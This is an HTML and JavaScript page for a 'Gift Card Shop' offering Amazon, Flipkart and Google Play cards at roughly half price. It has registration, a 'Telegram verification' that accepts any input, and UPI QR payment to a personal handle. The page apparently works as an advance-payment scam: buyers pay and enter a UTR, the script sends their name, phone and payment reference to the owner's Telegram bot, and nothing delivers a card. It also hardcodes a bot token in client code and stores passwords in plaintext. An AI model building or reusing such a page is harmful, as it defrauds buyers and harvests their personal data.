<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Shop</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a2a, #0f0f3a);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        .container{max-width: 500px;margin: 0 auto;}
        .card{
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #00ff88;
            text-align: center;
        }
        h2{color: #00ff88;margin-bottom: 20px;}
        input{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #1a1a3a;
            border: 1px solid #00ff88;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
        }
        button{
            width: 100%;
            padding: 12px;
            background: #00ff88;
            border: none;
            border-radius: 10px;
            color: #0a0a2a;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button.secondary{background: #333;color: white;}
        .platform-btn{
            display: inline-block;
            padding: 10px 20px;
            margin: 5px;
            background: #1a1a3a;
            border: 1px solid #00ff88;
            border-radius: 25px;
            cursor: pointer;
        }
        .platform-btn.active{background: #00ff88;color: #0a0a2a;}
        .gift-item{
            display: flex;
            justify-content: space-between;
            padding: 15px;
            border-bottom: 1px solid #333;
            cursor: pointer;
            background: #1a1a3a;
            margin: 5px 0;
            border-radius: 10px;
        }
        .gift-item:hover{background: #2a2a4a;}
        .gift-price{color: #00ff88;font-weight: bold;}
        .hidden{display: none;}
        .telegram-btn{
            display: inline-block;
            background: #0088cc;
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            text-decoration: none;
            margin: 15px 0;
            font-weight: bold;
        }
        .popup{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        .popup.active{display: flex;}
        .popup-card{
            background: #1a1a3a;
            border-radius: 30px;
            padding: 35px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            border: 1px solid #00ff88;
        }
        .qr-img{width: 200px;margin: 15px auto;display: block;background: white;padding: 10px;border-radius: 16px;}
        .note{font-size: 12px;color: #888;margin-top: 10px;}
    </style>
</head>
<body>
<div class="container" id="app"></div>

<script>
const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
const OWNER_ID = "8558052873";
const BOT_USERNAME = "giftclerkbot";

let currentUser = null;
let currentGift = null;

function saveUser(user){
    let users = JSON.parse(localStorage.getItem('users') || '{}');
    users[user.phone] = user;
    localStorage.setItem('users', JSON.stringify(users));
}

function getUsers(){
    return JSON.parse(localStorage.getItem('users') || '{}');
}

function showLogin(){
    document.getElementById('app').innerHTML = `
        <div class="card">
            <h2>🔐 GIFT CARD SHOP</h2>
            <div id="msg" style="color:#00ff88;margin-bottom:10px;"></div>
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Login</button>
            <button onclick="showRegister()" class="secondary">New User? Register</button>
        </div>
    `;
}

function showRegister(){
    document.getElementById('app').innerHTML = `
        <div class="card">
            <h2>📝 REGISTER</h2>
            <div id="msg" style="color:#00ff88;margin-bottom:10px;"></div>
            <input type="text" id="name" placeholder="Full Name">
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="register()">Register</button>
            <button onclick="showLogin()" class="secondary">Back</button>
        </div>
    `;
}

function showVerify(){
    document.getElementById('app').innerHTML = `
        <div class="card">
            <h2>🤖 VERIFY TELEGRAM</h2>
            <div id="msg" style="color:#00ff88;margin-bottom:10px;"></div>
            <a href="tg://resolve?domain=${BOT_USERNAME}" target="_blank" class="telegram-btn">📱 Open @${BOT_USERNAME}</a>
            <p>Send <strong>/start</strong> to the bot</p>
            <input type="text" id="code" placeholder="Paste code from bot">
            <button onclick="verify()">Verify</button>
        </div>
    `;
}

function showShop(){
    const products = [
        {name:"Amazon ₹100", val:100, price:50},
        {name:"Amazon ₹200", val:200, price:100},
        {name:"Amazon ₹500", val:500, price:250},
        {name:"Amazon ₹1000", val:1000, price:499},
        {name:"Amazon ₹2000", val:2000, price:949},
        {name:"Flipkart ₹100", val:100, price:50},
        {name:"Flipkart ₹200", val:200, price:100},
        {name:"Flipkart ₹500", val:500, price:250},
        {name:"Flipkart ₹1000", val:1000, price:499},
        {name:"Google Play ₹100", val:100, price:50},
        {name:"Google Play ₹200", val:200, price:100},
        {name:"Google Play ₹500", val:500, price:250}
    ];
    
    let html = '<div class="card"><h2>🛍️ Welcome '+currentUser.name+'</h2><div id="msg" style="color:#00ff88;margin-bottom:10px;"></div>';
    products.forEach(p => {
        html += '<div class="gift-item" onclick="selectGift(\''+p.name+'\','+p.val+','+p.price+')"><span>'+p.name+'</span><span class="gift-price">Pay ₹'+p.price+'</span></div>';
    });
    html += '<button onclick="logout()" class="secondary">Logout</button></div>';
    html += '<div id="qrPopup" class="popup"><div class="popup-card"><h3>💳 PAYMENT</h3><div id="payDetails"></div><img id="qrImg" class="qr-img"><p>UPI: <strong>ninadxclerk@fam</strong></p><input type="text" id="utr" placeholder="Enter UTR"><button onclick="submitPay()">Submit</button><button onclick="closePay()" class="secondary">Cancel</button></div></div>';
    document.getElementById('app').innerHTML = html;
}

function selectGift(name, val, price){
    currentGift = {name, val, price};
    document.getElementById('payDetails').innerHTML = '<p><strong>'+name+'</strong><br>Gift Value: ₹'+val+'<br><span style="color:#00ff88;">Pay: ₹'+price+'</span></p>';
    const upi = 'upi://pay?pa=ninadxclerk@fam&am='+price;
    document.getElementById('qrImg').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(upi);
    document.getElementById('qrPopup').classList.add('active');
}

function closePay(){
    document.getElementById('qrPopup').classList.remove('active');
}

function submitPay(){
    let utr = document.getElementById('utr').value;
    if(!utr){ alert('Enter UTR'); return; }
    let orders = JSON.parse(localStorage.getItem('orders_'+currentUser.phone) || '[]');
    orders.push({name:currentGift.name, val:currentGift.val, price:currentGift.price, utr:utr, status:'pending', time:new Date().toISOString()});
    localStorage.setItem('orders_'+currentUser.phone, JSON.stringify(orders));
    fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:OWNER_ID, text:'🆕 ORDER!\nUser: '+currentUser.name+'\nPhone: '+currentUser.phone+'\nTG ID: '+currentUser.telegramId+'\nProduct: '+currentGift.name+'\nPaid: ₹'+currentGift.price+'\nUTR: '+utr})
    });
    alert('Order placed! You will receive gift card within 24 hours.');
    closePay();
}

function register(){
    let name = document.getElementById('name').value;
    let phone = document.getElementById('phone').value;
    let pwd = document.getElementById('password').value;
    if(!name || !phone || !pwd){ alert('Fill all'); return; }
    let users = getUsers();
    if(users[phone]){ alert('Phone exists'); return; }
    saveUser({name, phone, password:pwd, telegramId:null});
    alert('Registered! Login now');
    showLogin();
}

function login(){
    let phone = document.getElementById('phone').value;
    let pwd = document.getElementById('password').value;
    let users = getUsers();
    let user = users[phone];
    if(user && user.password === pwd){
        currentUser = user;
        if(!user.telegramId){
            showVerify();
        } else {
            showShop();
        }
    } else { alert('Invalid'); }
}

function verify(){
    let code = document.getElementById('code').value;
    if(!code){ alert('Enter code'); return; }
    currentUser.telegramId = code;
    let users = getUsers();
    users[currentUser.phone].telegramId = code;
    localStorage.setItem('users', JSON.stringify(users));
    alert('Verified!');
    showShop();
}

function logout(){
    currentUser = null;
    showLogin();
}

showLogin();
</script>
</body>
</html>